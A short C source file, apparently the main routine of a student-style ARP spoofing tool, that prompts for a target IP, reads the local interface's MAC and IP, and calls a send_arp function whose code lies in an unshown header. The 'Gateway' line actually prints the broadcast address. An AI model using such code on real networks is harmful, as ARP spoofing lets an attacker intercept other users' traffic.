//main.cpp

#include <stdio.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <stdlib.h>
#include <pcap.h>
#include "arp_spoof.h"

int main()
{
	int fd;					//for socket
	struct ifreq ifr;
	struct in_addr addr;
	char buf[INET_ADDRSTRLEN];
	char victim_ip[34];
	char iface[] = "eth0";
	pcap_t *handle = NULL;
	u_char *s_mac;
	u_char *d_mac;

	struct in_addr s_ip;
	struct in_addr d_ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	puts("IP address of the target : ");
	
	while(1)
	{
		fgets(victim_ip, sizeof(victim_ip), stdin);
		victim_ip[strlen(victim_ip) - 1] = '\0';
	
		if(inet_pton(AF_INET, victim_ip, &d_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}

	printf("\nMy Network Status: \n");
	printf("Device: %s\n", iface);
	
        ioctl(fd, SIOCGIFHWADDR, &ifr);
	
	s_mac = (u_char *)malloc(6);
	d_mac = (u_char *)malloc(6);

	memcpy(s_mac, (u_char *)ifr.ifr_hwaddr.sa_data, 6);
	
	//MAC address
	printf("MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
		s_mac[0], s_mac[1], s_mac[2], s_mac[3], s_mac[4], s_mac[5]);
	
	//IP addrses
        ioctl(fd, SIOCGIFADDR, &ifr);
	s_ip = ((struct sockaddr_in *)&ifr.ifr_addr) -> sin_addr;
	printf("IP address: %s\n", inet_ntop(AF_INET, &s_ip, buf, sizeof(buf)));
	
	//Gateway
	ioctl(fd, SIOCGIFBRDADDR, &ifr);
	printf("Gateway: %s\n", inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_broadaddr) -> sin_addr), buf, sizeof(buf)));

	printf("\nVictim Network Status: \n");

	send_arp(s_mac, d_mac, s_ip, d_ip, handle);
	//packet_spoof(s_mac, d_mac, s_ip, d_ip, handle);
	
	close(fd);
	free(s_mac);
	free(d_mac);
	return 0;
}
